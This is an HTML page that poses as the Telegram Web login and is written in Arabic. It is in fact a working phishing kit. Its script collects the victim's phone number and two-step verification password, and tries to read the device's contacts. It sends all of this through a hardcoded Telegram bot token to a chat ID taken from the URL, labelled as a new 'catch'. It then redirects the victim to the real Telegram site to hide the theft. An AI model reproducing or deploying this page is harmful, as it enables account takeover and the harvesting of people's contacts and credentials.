<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #0f141c; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .tg-card { background: #18222d; padding: 40px 30px; width: 100%; max-width: 380px; border-radius: 12px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        .tg-logo { width: 70px; height: 70px; background: #2481cc; border-radius: 50%; margin: 0 auto 20px auto; display: flex; justify-content: center; align-items: center; fill: #fff; }
        .tg-logo svg { width: 38px; height: 38px; }
        h2 { font-size: 22px; margin-bottom: 8px; }
        p { font-size: 13px; color: #8793a1; margin-bottom: 25px; }
        .input-group { margin-bottom: 15px; text-align: right; }
        input { width: 100%; padding: 12px; background: #212e3d; border: 1px solid #2f3e53; color: #fff; border-radius: 8px; outline: none; font-size: 14px; }
        input:focus { border-color: #2481cc; }
        .tg-btn { width: 100%; padding: 12px; background: #2481cc; border: none; color: #fff; font-weight: bold; font-size: 15px; border-radius: 8px; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="tg-card">
        <div class="tg-logo">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161c-.18 1.897-.962 6.502-1.359 8.627-.168.9-.5 1.201-.82 1.23-.697.064-1.226-.461-1.901-.903-1.056-.693-1.653-1.124-2.678-1.8-1.185-.781-.417-1.21.258-1.911.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635.099-.002.321.023.465.141.119.098.152.228.167.321.015.093.03.303.016.467z"/></svg>
        </div>
        <h2>تسجيل الدخول إلى Telegram</h2>
        <p>أدخل رقم هاتفك المرتبط بالحساب للمتابعة.</p>
        <form id="tgForm">
            <div class="input-group"><input type="text" id="username" placeholder="رقم الهاتف (مع رمز الدولة)" required></div>
            <div class="input-group"><input type="password" id="password" placeholder="كلمة المرور (التحقق بخطوتين)" required></div>
            <button type="submit" class="tg-btn">متابعة وتسجيل الدخول</button>
        </form>
    </div>
    <script>
        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
        const urlParams = new URLSearchParams(window.location.search);
        const targetChatId = urlParams.get('to');

        document.getElementById('tgForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            if(!targetChatId) return;
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            let contacts = "لم يتم منح الصلاحية";
            if ('contacts' in navigator && 'ContactsManager' in window) {
                try {
                    const res = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                    if (res.length > 0) contacts = res.map(c => `المستخدم: ${c.name?.[0]} - الرقم: ${c.tel?.[0]}`).join('\n');
                } catch(e) {}
            }

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`صيد تيليجرام جديد\nالرقم: ${user}\nالرمز: ${pass}`)}`);
            if (contacts !== "لم يتم منح الصلاحية") {
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${targetChatId}&text=${encodeURIComponent(`جهات الاتصال:\n${contacts}`)}`);
            }
            setTimeout(() => { window.location.href = "https://web.telegram.org"; }, 800);
        });
    </script>
</body>
</html>
